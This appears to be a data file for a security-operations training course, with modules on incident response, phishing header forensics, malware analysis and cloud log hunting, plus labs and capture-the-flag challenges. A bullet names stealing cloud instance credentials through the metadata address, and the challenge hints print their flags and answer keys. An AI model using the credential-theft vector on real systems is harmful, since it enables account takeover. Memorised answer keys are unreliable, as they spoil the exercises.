    summary: "Execute the NIST SP 800-61 IR lifecycle. Triage malicious phishing emails, execute emergency host containment, and neutralize live ransomware outbreaks.",

    slides: [
      {
        id: 1,
        title: "The NIST Incident Response Lifecycle",
        subtitle: "NIST SP 800-61 Rev 2 Four-Phase Standard",
        bullets: [
          "Phase 1: Preparation (Hardening, playbooks, tools, training, jump kits).",
          "Phase 2: Detection & Analysis (Continuous triage, scoping incident boundaries, determining severity).",
          "Phase 3: Containment, Eradication & Recovery (Host isolation, account resets, malware removal, system restoration).",
          "Phase 4: Post-Incident Activity (Lessons Learned, forensic post-mortem, metrics review)."
        ],
        diagram: `
 ┌────────────────────────────────────────────────────────┐
 │                    1. PREPARATION                      │
 └──────────────────────────┬─────────────────────────────┘
                            ▼
 ┌────────────────────────────────────────────────────────┐
 │               2. DETECTION & ANALYSIS                  │
 └──────────────────────────┬─────────────────────────────┘
                            ▼
 ┌────────────────────────────────────────────────────────┐
 │       3. CONTAINMENT, ERADICATION & RECOVERY           │
 └──────────────────────────┬─────────────────────────────┘
                            ▼
 ┌────────────────────────────────────────────────────────┐
 │                4. POST-INCIDENT ACTIVITY               │
 └────────────────────────────────────────────────────────┘`
      },
      {
        id: 2,
        title: "Ransomware Emergency Containment Playbook",
        subtitle: "Actions in the First 10 Minutes of Outbreak",
        bullets: [
          "Minute 0-2: Sever the Network — Isolate infected host via EDR network containment or physical cable disconnect. DO NOT power off (preserves RAM!).",
          "Minute 2-5: Scope Lateral Infection — Check Active Directory for mass kerberoasting or anomalous SMB writes across network file shares.",
          "Minute 5-7: Kill Active Process & Revoke Credentials — Suspend malicious PID, reset compromised Domain Admin tokens.",
          "Minute 7-10: Block C2 & External Communications — Apply immediate firewall blackholes and DNS RPZ blocks."
        ],
        diagram: `
 [ RANSOMWARE DETECTED ] ➔ [ ISOLATE HOST (EDR) ] ➔ [ DO NOT SHUT DOWN (Preserve RAM) ]
                                    │
 [ Reset Compromised AD Account ] <─┴─> [ Blackhole C2 IP on Perimeter Firewall ]`
      },
      {
        id: 3,
        title: "Phishing Email Header Forensics",
        subtitle: "Unmasking Spoofed Senders in MIME Headers",
        bullets: [
          "Look at the `Received:` headers from bottom to top (bottom-most is the originating sending server).",
          "`Authentication-Results`: Check SPF (Sender Policy Framework), DKIM (DomainKeys Identified Mail), and DMARC passes or fails.",
          "`Reply-To`: Often differs from the display name to redirect victim responses to the attacker inbox.",
          "Attachment Triage: Check hash on VirusTotal, inspect macros in `.docm` or `.xlsm` using `olevba`."
        ]
      }
    ],

    theory: {
      overview: "When active intrusion occurs, seconds matter. Here are the operational commands and playbooks utilized by Incident Responders.",
      sections: [
        {
          heading: "1. Critical Containment Commands",
          content: "Use these operational commands to sever attacker control on Windows hosts:",
          codeBlock: `# 1. Emergency Host Isolation (Windows Firewall block all except management)
netsh advfirewall set allprofiles state on
netsh advfirewall firewall add rule name="EMERGENCY_ISOLATE" dir=out action=block
netsh advfirewall firewall add rule name="EMERGENCY_ISOLATE_IN" dir=in action=block

# 2. Kill Malicious Process Tree
taskkill /F /PID [MALICIOUS_PID] /T

# 3. Disable Compromised Active Directory Account
Disable-ADAccount -Identity "CompromisedUser"

# 4. Dump RAM for Forensics using WinPmem
winpmem.exe -o C:\\Forensics\\mem_dump.raw`
        }
      ]
    },

    lab: {
      title: "Interactive Phishing Email Header Analyzer",
      scenario: "A finance employee reported an email claiming to be from the CEO demanding urgent wire transfer. Review the raw email headers to identify the real sender IP and phishing attachment.",
      type: "email-header-sim",
      rawHeaders: `From: "CEO John Miller" <john.miller@ceo-corporate.com>
To: sarah.connor@corp.local
Subject: URGENT: Wire Transfer Invoice Attached
Date: Thu, 26 Nov 2026 04:12:10 +0000
Return-Path: <attacker@spoofed-phish-domain.xyz>
Received: from mail.spoofed-phish-domain.xyz (mail.spoofed-phish-domain.xyz [198.51.100.77])
    by mail.corp.local with ESMTP id a91k28fa;
Authentication-Results: mail.corp.local;
    spf=fail (sender IP 198.51.100.77 is not permitted)
    dmarc=fail (p=reject)
Attachment: Invoice_November_2026.pdf.exe
SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`,
      taskInstructions: "1. Inspect the Authentication-Results: SPF and DMARC failed.\n2. Note the originating IP address: 198.51.100.77.\n3. Identify the double extension in the attachment: 'Invoice_November_2026.pdf.exe'."
    },

    challenge: {
      question: "What is the true originating IP address of the attacker mail server that sent the spoofed email?",
      targetKey: "198.51.100.77",
      flag: "flag{ph1sh1ng_c0nta1nm3nt_succ3ss}",
      hint: "Look at the Received header and Authentication-Results: sender IP is 198.51.100.77. The flag is flag{ph1sh1ng_c0nta1nm3nt_succ3ss}",
      points: 150
    }
  },

  {
    id: "soc-mod-07",
    slug: "forensic-investigation-malware-analysis",
    moduleNumber: "07",
    title: "Forensic Investigation and Malware Analysis",
    category: "ir",
    categoryLabel: "Forensics & Malware",
    status: "locked",
    progress: 0,
    difficulty: "Advanced",
    duration: "70 Mins",
    slideCount: 18,
    labCount: "Slides Only",
    tags: ["Static Analysis", "Dynamic Analysis", "ProcMon & INetSim"],
    skills: ["Memory Forensics", "Static Analysis", "Dynamic Sandboxing", "ProcMon Triage", "PowerShell Deobfuscation"],
    summary: "Perform static and dynamic malware analysis: hashes, strings, VirusTotal, Process Monitor (ProcMon), PowerShell decompression, and INetSim execution capture.",

    slides: [
      { id: 1, title: "Malware Analysis", image: "/soc-slides/module-07/1.png" },
      { id: 2, title: "Static Analysis", image: "/soc-slides/module-07/2.png" },
      { id: 3, title: "HASH (SHA256 Verification)", image: "/soc-slides/module-07/3.png" },
      { id: 4, title: "Strings (strings, FLOSS, PEStudio)", image: "/soc-slides/module-07/4.png" },
      { id: 5, title: "Upload (VirusTotal & Any.Run)", image: "/soc-slides/module-07/5.png" },
      { id: 6, title: "Dynamic Analysis", image: "/soc-slides/module-07/6.png" },
      { id: 7, title: "Open The File", image: "/soc-slides/module-07/7.png" },
      { id: 8, title: "ProcMon Filter (Process Name & Parent ID)", image: "/soc-slides/module-07/8.png" },
      { id: 9, title: "ProcMon Process Monitor Inspection", image: "/soc-slides/module-07/9.png" },
      { id: 10, title: "Decode PowerShell Command", image: "/soc-slides/module-07/10.png" },
      { id: 11, title: "Compressed Base64 Output", image: "/soc-slides/module-07/11.png" },
      { id: 12, title: "Compressed Gzip Data Inspection", image: "/soc-slides/module-07/12.png" },
      { id: 13, title: "Decompressed Payload", image: "/soc-slides/module-07/13.png" },
      { id: 14, title: "Content (Deobfuscated Powerfun Script)", image: "/soc-slides/module-07/14.png" },
      { id: 15, title: "Decode Domain & INetSim Setup", image: "/soc-slides/module-07/15.png" },
      { id: 16, title: "INetSim Simulated Network Services", image: "/soc-slides/module-07/16.png" },
      { id: 17, title: "Act As A Hacker (Hosts Redirect)", image: "/soc-slides/module-07/17.png" },
      { id: 18, title: "Act As A Hacker (Reverse Shell Listener)", image: "/soc-slides/module-07/18.png" }
    ],

    lab: null,
    challenge: null
  },

  {
    id: "soc-mod-08",
    slug: "soc-for-cloud-environments",
    moduleNumber: "08",
    title: "SOC for Cloud Environments",
    category: "ir",
    categoryLabel: "Cloud Defense",
    status: "locked",
    progress: 0,
    difficulty: "Advanced",
    duration: "60 Mins",
    slideCount: 16,
    labCount: "4 Cloud Range Labs",
    tags: ["AWS CloudTrail", "Azure Sentinel", "Cloud IAM Security"],
    skills: ["AWS CloudTrail", "Microsoft Sentinel", "Cloud IAM Auditing", "Multi-Cloud Security", "Container Security"],
    summary: "Monitor AWS CloudTrail, Azure Monitor, and Google Cloud Audit Logs. Hunt cloud IAM privilege escalation, bucket leaks, and container attacks.",

    slides: [
      {
        id: 1,
        title: "The Cloud Threat Surface",
        subtitle: "Shared Responsibility & Multi-Cloud Observability",
        bullets: [
          "In the Cloud, Identity is the new perimeter: IAM roles, service accounts, and API tokens replace physical network boundaries.",
          "Shared Responsibility Model: Cloud Provider secures the cloud infrastructure; the Customer secures identity, configurations, workloads, and data.",
          "Core Telemetry: AWS CloudTrail (management & data events), Amazon GuardDuty, Azure Activity Logs, and Google Cloud Audit Logs."
        ],
        diagram: `
 ┌────────────────────────────────────────────────────────┐
 │              CLOUD TELEMETRY INGESTION                 │
 ├────────────────────────────────────────────────────────┤
 │ AWS CloudTrail / VPC Flow Logs / GuardDuty             │
 │ Azure Monitor / Entra ID / Microsoft Sentinel          │
 │ Google Cloud Audit Logs / Security Command Center      │
 └──────────────────────────┬─────────────────────────────┘
                            ▼
           [ Enterprise SIEM & Cloud SOAR ]`
      },
      {
        id: 2,
        title: "Top Cloud Attack Vectors",
        subtitle: "From Compromised Access Keys to Total Account Takeover",
        bullets: [
          "Compromised Credentials: API access keys leaked on GitHub or hardcoded into Docker images.",
          "Privilege Escalation: Exploiting permissive IAM policies (`iam:AttachUserPolicy`, `iam:PassRole`, `sts:AssumeRole`).",
          "Public Storage Exposure: S3 buckets or Azure Blob Storage misconfigured with public read/write permissions.",
          "Instance Metadata Service (IMDS) SSRF: Stealing temporary instance credentials via `http://169.254.169.254`."
        ]
      },
      {
        id: 3,
        title: "Hunting Anomalous Cloud Actions",
        subtitle: "Key CloudTrail Events Every SOC Analyst Monitors",
        bullets: [
          "`ConsoleLoginWithoutMFA`: Management console access without multi-factor authentication.",
          "`CreateAccessKey` / `CreateLoginProfile`: Attacker establishing persistent backdoor access.",
          "`StopLogging` / `DeleteTrail`: Anti-forensics attempt to blind SOC monitoring.",
          "`AuthorizeSecurityGroupIngress`: Opening 0.0.0.0/0 to SSH (Port 22) or RDP (Port 3389)."
        ]
      }
    ],

    theory: {
      overview: "Cloud security operations require mastery over API-driven architecture, IAM permissions, and centralized cloud audit streams.",
      sections: [
        {
          heading: "1. Critical CloudTrail Investigation Commands",
          content: "Use AWS CLI or SIEM queries to investigate compromised IAM keys:",
          codeBlock: `# 1. Search for root account activity
aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=root

# 2. Check for newly attached Administrator policies
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AttachUserPolicy

# 3. List recent security group rule modifications
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AuthorizeSecurityGroupIngress`
        }
      ]
    },

    lab: {
      title: "Interactive AWS CloudTrail Log Analyzer",
      scenario: "GuardDuty alerted on an anomalous IAM policy attachment from an external Tor exit node IP. Inspect the CloudTrail JSON event log below to identify the compromised IAM user account.",
      type: "cloud-sim",
      cloudTrailEvent: `{
  "eventVersion": "1.08",
  "userIdentity": {
    "type": "IAMUser",
    "principalId": "AIDAJ456EXAMPLE",
    "arn": "arn:aws:iam::123456789012:user/dev-deploy-key",
    "accountId": "123456789012",
    "accessKeyId": "AKIAIOSFODNN7EXAMPLE",
    "userName": "dev-deploy-key"
  },
  "eventTime": "2026-11-26T21:12:00Z",
  "eventSource": "iam.amazonaws.com",
  "eventName": "AttachUserPolicy",
  "awsRegion": "us-east-1",
  "sourceIPAddress": "198.51.100.89",
  "userAgent": "aws-cli/2.15.0 Python/3.11.4",
  "requestParameters": {
    "userName": "dev-deploy-key",
    "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
  },
  "responseElements": null
}`,
      taskInstructions: "1. Examine the userIdentity and requestParameters.\n2. Note the userName: 'dev-deploy-key'.\n3. Confirm that AdministratorAccess was attached from IP 198.51.100.89."
    },

    challenge: {
      question: "What is the compromised AWS IAM user account name that attached AdministratorAccess to itself in the CloudTrail log?",
      targetKey: "dev-deploy-key",
      flag: "flag{cl0ud_1am_pr1v_3sc_d3t3ct3d}",
      hint: "Look at the userName inside userIdentity and requestParameters: 'dev-deploy-key'. The flag is flag{cl0ud_1am_pr1v_3sc_d3t3ct3d}",
      points: 150
    }
  }
];
